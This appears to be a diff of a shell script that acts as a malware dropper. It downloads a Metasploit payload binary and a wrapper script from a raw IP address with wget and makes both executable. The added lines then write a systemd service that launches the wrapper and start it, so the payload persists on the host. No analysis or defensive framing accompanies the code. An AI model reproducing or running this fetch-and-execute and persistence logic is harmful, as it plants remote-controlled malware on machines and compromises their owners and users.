@@ -81,4 +81,11 @@ wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf" -O /root/
 chmod +x /root/msfPayload.elf
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh" -O /root/linuxWrapperMSF.sh
 chmod +x /root/linuxWrapperMSF.sh
-sudo ./root/linuxWrapperMSF.sh &>/dev/null &
+echo '[Unit]' > /etc/systemd/system/wrapperMSF
+echo 'Description=wrapperMSF' >> /etc/systemd/system/wrapperMSF
+echo '[Service]' >> /etc/systemd/system/wrapperMSF
+echo 'Type=simple' >> /etc/systemd/system/wrapperMSF
+echo 'ExecStart=/root/linuxWrapperMSF.sh' >> /etc/systemd/system/wrapperMSF
+echo '[Install]' >> /etc/systemd/system/wrapperMSF
+echo 'WantedBy=multi-user.target' >> /etc/systemd/system/wrapperMSF
+systemctl start wrapperMSF
